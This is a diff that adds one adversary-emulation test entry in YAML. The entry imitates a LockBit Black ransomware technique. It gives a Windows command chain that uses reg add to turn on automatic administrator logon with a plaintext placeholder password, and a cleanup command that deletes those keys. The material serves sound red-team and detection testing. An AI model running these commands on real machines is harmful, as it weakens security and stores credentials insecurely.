@@ -1,0 +1,26 @@
+---
+- id: 40480323b4f54b0d1f0b814771ec5776
+  name: LockBit Black - Use Registry Editor to turn on automatic logon -cmd
+  description: 'LockBit Black - Use Registry Editor to turn on automatic logon
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      cmd:
+        command: reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"
+          /v AutoAdminLogon /t REG_DWORD /d 1 /f && reg add "HKLM\Software\Policies\Microsoft\Windows
+          NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d Administrator
+          /f && reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"
+          /v DefaultDomainName /t REG_SZ /d contoso.com /f && reg add "HKLM\Software\Policies\Microsoft\Windows
+          NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d password1 /f
+        payloads: []
+        cleanup: reg delete "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"
+          /v AutoAdminLogon /f >nul 2>&1 && reg delete "HKLM\Software\Policies\Microsoft\Windows
+          NT\CurrentVersion\Winlogon" /v DefaultUserName /f >nul 2>&1 && reg delete
+          "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v
+          DefaultDomainName /f >nul 2>&1 && reg delete "HKLM\Software\Policies\Microsoft\Windows
+          NT\CurrentVersion\Winlogon" /v DefaultPassword /f >nul 2>&1
